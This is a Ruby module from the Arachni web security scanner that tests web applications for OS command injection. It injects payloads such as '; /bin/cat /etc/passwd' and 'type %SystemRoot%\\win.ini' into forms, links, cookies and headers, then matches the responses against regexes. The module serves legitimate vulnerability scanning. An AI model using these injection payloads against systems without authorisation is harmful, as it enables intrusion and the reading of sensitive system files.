=begin
    Copyright 2010-2013 Tasos Laskos <tasos.laskos@gmail.com>

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
=end

# Simple OS command injection module.
#
# @author Tasos "Zapotek" Laskos <tasos.laskos@gmail.com>
#
# @version 0.2.1
#
# @see http://cwe.mitre.org/data/definitions/78.html
# @see http://www.owasp.org/index.php/OS_Command_Injection
class Arachni::Modules::OSCmdInjection < Arachni::Module::Base

    def self.options
        @opts ||= {
            regexp: {
                unix: [
                    /(root|mail):.+:\d+:\d+:.+:[0-9a-zA-Z\/]+/im
                ],
                windows: [
                    /\[boot loader\](.*)\[operating systems\]/im,
                    /\[fonts\](.*)\[extensions\]/im
                ]
            },
            format: [ Format::STRAIGHT, Format::APPEND ]
        }
    end

    def self.payloads
        @payloads ||= {
            unix:    [ '/bin/cat /etc/passwd' ],
            windows: [ 'type %SystemDrive%\\\\boot.ini',
                       'type %SystemRoot%\\\\win.ini' ]
        }.inject({}) do |h, (platform, payloads)|
            h[platform] ||= []
            payloads.each do |payload|
                h[platform] |= [ '', '&&', '|', ';' ].map { |sep| "#{sep} #{payload}" }
                h[platform] << "` #{payload}`"
            end
            h
        end
    end

    def run
        audit self.class.payloads, self.class.options
    end

    def self.info
        {
            name:        'OS command injection',
            description: %q{Tries to find operating system command injections.},
            elements:    [ Element::FORM, Element::LINK, Element::COOKIE, Element::HEADER ],
            author:      'Tasos "Zapotek" Laskos <tasos.laskos@gmail.com> ',
            version:     '0.2.1',
            references:  {
                'OWASP' => 'http://www.owasp.org/index.php/OS_Command_Injection'
            },
            targets:     %w(Windows Unix),
            issue:       {
                name:            %q{Operating system command injection},
                description:     %q{The web application allows an attacker to
    execute arbitrary OS commands.},
                tags:            %w(os command code injection regexp),
                cwe:             '78',
                severity:        Severity::HIGH,
                cvssv2:          '9.0',
                remedy_guidance: %q{User inputs must be validated and filtered
    before being evaluated as OS level commands.},
                remedy_code:     '',
                metasploitable:  'unix/webapp/arachni_exec'
            }
        }
    end

end
